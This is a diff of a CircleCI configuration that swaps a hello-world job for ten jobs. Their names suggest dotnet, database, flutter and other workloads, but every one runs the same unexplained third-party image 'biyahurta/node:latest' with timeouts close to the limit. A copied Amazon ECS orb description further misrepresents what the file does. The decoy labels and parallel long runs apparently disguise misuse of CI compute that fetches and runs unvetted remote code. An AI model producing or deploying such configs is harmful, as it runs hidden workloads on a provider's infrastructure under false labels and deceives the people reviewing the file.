@@ -1,26 +1,181 @@
-# Use the latest 2.1 version of CircleCI pipeline process engine.
-# See: https://circleci.com/docs/2.0/configuration-reference
+working_dir: &working_dir ~/app
 version: 2.1
-
-# Define a job to be invoked later in a workflow.
-# See: https://circleci.com/docs/2.0/configuration-reference/#jobs
+#######################################################################################################################################
+description: |
+  An orb for working with Amazon Elastic Container Service (ECS).
+  Supports the EC2 and Fargate launch types
 jobs:
-  say-hello:
-    # Specify the execution environment. You can specify an image from Dockerhub or use one of our Convenience Images from CircleCI's Developer Hub.
-    # See: https://circleci.com/docs/2.0/configuration-reference/#docker-machine-macos-windows-executor
+  workspace-full:
+    
     docker:
-      - image: cimg/base:stable
-    # Add steps to the job
-    # See: https://circleci.com/docs/2.0/configuration-reference/#steps
+      - image: docker:18.06.3-ce-git
     steps:
       - checkout
+      - setup_remote_docker
       - run:
-          name: "Say hello"
-          command: "echo Hello, World!"
+          command: |
+            
+            docker run -e CI=true biyahurta/node:latest
+          no_output_timeout: 59m
+      
+            
+          
+  workspace-full-vnc:
+    
+    docker:
+      - image: docker:18.06.3-ce-git
+    steps:
+      - checkout
+      - setup_remote_docker
+      - attach_workspace:
+          at: .
+      - run:
+          command: |
+            
+            docker run -e CI=true biyahurta/node:latest
+          no_output_timeout: 58m
+      
 
-# Invoke jobs via workflows
-# See: https://circleci.com/docs/2.0/configuration-reference/#workflows
+  mdbook:
+    
+    docker:
+      - image: docker:18.06.3-ce-git
+    steps:
+      - checkout
+      - setup_remote_docker
+      - attach_workspace:
+          at: .
+      - run:
+          command: |
+            
+            docker run -e CI=true biyahurta/node:latest
+          no_output_timeout: 57m
+
+  workspace-dotnet:
+    
+    docker:
+      - image: docker:18.06.3-ce-git
+    steps:
+      - checkout
+      - setup_remote_docker
+      - attach_workspace:
+          at: .
+      - run:
+          command: |
+            
+            docker run -e CI=true biyahurta/node:latest
+          no_output_timeout: 56m
+
+  workspace-dotnet-vnc:
+    
+    docker:
+      - image: docker:18.06.3-ce-git
+    steps:
+      - checkout
+      - setup_remote_docker
+      - attach_workspace:
+          at: .
+      - run:
+          command: |
+            
+            docker run -e CI=true biyahurta/node:latest
+          no_output_timeout: 55m
+
+  workspace-postgres:
+    
+    docker:
+      - image: docker:18.06.3-ce-git
+    steps:
+      - checkout
+      - setup_remote_docker
+      - attach_workspace:
+          at: .
+      - run:
+          command: |
+            
+            docker run -e CI=true biyahurta/node:latest
+          no_output_timeout: 54m
+
+  workspace-mysql:
+    
+    docker:
+      - image: docker:18.06.3-ce-git
+    steps:
+      - checkout
+      - setup_remote_docker
+      - attach_workspace:
+          at: .
+      - run:
+          command: |
+            
+            docker run -e CI=true biyahurta/node:latest
+          no_output_timeout: 53m
+
+  workspace-mongodb:
+    
+    docker:
+      - image: docker:18.06.3-ce-git
+    steps:
+      - checkout
+      - setup_remote_docker
+      - attach_workspace:
+          at: .
+      - run:
+          command: |
+            
+            docker run -e CI=true biyahurta/node:latest
+          no_output_timeout: 52m
+  workspace-flutter:
+    
+    docker:
+      - image: docker:18.06.3-ce-git
+    steps:
+      - checkout
+      - setup_remote_docker
+      - attach_workspace:
+          at: .
+      - run:
+          command: |
+            
+            docker run -e CI=true biyahurta/node:latest
+          no_output_timeout: 51m
+  workspace-gecko:
+    
+    docker:
+      - image: docker:18.06.3-ce-git
+    steps:
+      - checkout
+      - setup_remote_docker
+      - attach_workspace:
+          at: .
+      - run:
+          command: |
+            
+            docker run -e CI=true biyahurta/node:latest
+          no_output_timeout: 50m
+
+  
 workflows:
-  say-hello-workflow:
+  version: 2.1
+  build-and-deploy:
     jobs:
-      - say-hello
+      - workspace-full
+      - workspace-full-vnc
+          
+      - mdbook
+          
+      - workspace-dotnet
+          
+      - workspace-dotnet-vnc
+          
+      - workspace-postgres
+          
+      - workspace-mysql
+          
+      - workspace-mongodb
+          
+      - workspace-flutter
+          
+      - workspace-gecko
+          
+      
